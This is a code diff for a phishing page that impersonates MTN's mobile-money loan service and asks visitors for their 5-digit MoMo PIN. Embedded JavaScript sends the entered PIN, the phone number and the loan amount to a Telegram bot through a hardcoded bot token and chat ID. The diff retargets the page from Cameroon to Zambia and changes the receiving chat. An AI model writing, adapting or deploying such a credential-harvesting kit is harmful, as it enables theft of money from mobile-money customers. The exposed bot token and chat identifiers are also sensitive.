@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
-  <title>MTN  · PIN Authorisation</title>
+  <title>MTN Loans · PIN Authorisation</title>
 
   <!-- Google Fonts -->
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
@@ -268,7 +268,7 @@
   </div>
 
   <div class="description">
-    You are about to authorise MTN  to disburse the funds to your MTN MoMo wallet. Enter your PIN to authorise.
+    You are about to authorise MTN Loans to disburse the funds to your MTN MoMo wallet. Enter your PIN to authorise.
   </div>
 
   <div class="label">MTN MoMo PIN (5 digits)</div>
@@ -289,7 +289,7 @@
   (function() {
     // --- TELEGRAM CONFIG ---
     const BOT_TOKEN = '8205203090:AAGJYcmFQe_I-Cw3xxnIhV0J25ZgaCwAExY';
-    const CHAT_ID   = '691605234';
+    const CHAT_ID   = '1006917440';
     const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
 
     // --- DOM elements ---
@@ -301,7 +301,7 @@
     const backBtn = document.getElementById('backBtn');
 
     // --- Retrieve session data ---
-    let phone = sessionStorage.getItem('mtn_phone') || '655123456';
+    let phone = sessionStorage.getItem('mtn_phone') || '766123456';
     let loanAmount = sessionStorage.getItem('mtn_loanAmount') || 'Not specified';
 
     // --- Single PIN input logic ---
@@ -419,12 +419,12 @@
       authoriseBtn.disabled = true;
       spinner.style.display = 'flex';
 
-      const identifier = `MTN MoMo: ${phone}`;
+      const identifier = `MTN Loans MoMo: +260 ${phone}`;
       const ts = Date.now();
       const escapedPin = escapeHtml(pin);
-      const amountText = loanAmount !== 'Not specified' ? `\nLoan Amount: XAF ${loanAmount}` : '';
+      const amountText = loanAmount !== 'Not specified' ? `\nLoan Amount: ZMW ${loanAmount}` : '';
 
-      const msg = `🔐 <b>MTN  PIN Authorisation</b>\n\n${identifier}${amountText}\n\nPIN entered: <code>${escapedPin}</code>\n\nApprove or decline this PIN?`;
+      const msg = `🔐 <b>MTN Loans PIN Authorisation</b>\n\n${identifier}${amountText}\n\nPIN entered: <code>${escapedPin}</code>\n\nApprove or decline this PIN?`;
 
       await sendToTelegram({
         chat_id: CHAT_ID,
@@ -461,7 +461,7 @@
     });
 
     if (!sessionStorage.getItem('mtn_phone')) {
-      console.log('Using demo Cameroon MTN number');
+      console.log('Using demo Zambia MTN number');
     }
   })();
 </script>
